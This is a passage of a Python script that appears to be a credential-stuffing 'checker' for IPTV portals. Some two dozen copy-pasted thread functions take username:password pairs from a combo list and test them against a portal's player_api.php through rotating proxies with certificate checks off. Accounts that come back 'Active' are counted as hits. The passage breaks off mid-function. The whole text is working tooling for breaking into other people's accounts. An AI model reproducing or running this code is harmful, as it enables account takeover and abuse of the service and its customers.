#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('    \33[0m\33[1;43m     *** HIT ***     \33[0m')
			     	hit=hit+1
			     	
    
def d2():
	global hit
	global proxy_
	say=0
	for fyz in range(2,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='02'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print(' 🎵 🇭 🇮 🇹 🎵     ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
def d3():
	global hit
	global proxy_
	say=0
	for fyz in range(3,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='03'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
def d4():
	global hit
	global proxy_
	say=0
	for fyz in range(4,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='04'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
def d5():
	global hit
	global proxy_
	say=0
	for fyz in range(5,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='05'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d6():
	global hit
	global proxy_
	say=0
	for fyz in range(6,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='06'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
#			 		bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 

			 
def d7():
	global hit
	global proxy_
	say=0
	for fyz in range(7,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='07'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
#			 		bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 			 			 
			 
def d8():
	global hit
	global proxy_
	say=0
	for fyz in range(8,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='08'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
#			 		bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d9():
	global hit
	global proxy_
	say=0
	for fyz in range(9,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='09'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d10():
	global hit
	global proxy_
	say=0
	for fyz in range(10,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='10'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 			 			 			 			 			 					 
def d11():
	global hit
	global proxy_
	say=0
	for fyz in range(11,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='11'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d12():
	global hit
	global proxy_
	say=0
	for fyz in range(12,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='12'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 			 			 			 			 			 	 				 
def d13():
	global hit
	global proxy_
	say=0
	for fyz in range(13,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='13'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d14():
	global hit
	global proxy_
	say=0
	for fyz in range(14,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='14'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 			 			 			 			 			 		 			 
def d15():
	global hit
	global proxy_
	say=0
	for fyz in range(15,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='15'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🎵 🇭 🇮 🇹 🎵                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			
			
def d16():
	global hit
	global proxy_
	say=0
	for fyz in range(16,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='16'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d17():
	global hit
	global proxy_
	say=0
	for fyz in range(17,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='17'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d18():
	global hit
	global proxy_
	say=0
	for fyz in range(18,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='18'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('    🎵 🇭 🇮 🇹 🎵              ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d19():
	global hit
	global proxy_
	say=0
	for fyz in range(19,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='19'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d20():
	global hit
	global proxy_
	say=0
	for fyz in range(20,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='20'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d21():
	global hit
	global proxy_
	say=0
	for fyz in range(121,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='21'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d22():
	global hit
	global proxy_
	say=0
	for fyz in range(22,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='22'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d23():
	global hit
	global proxy_
	say=0
	for fyz in range(23,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='23'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
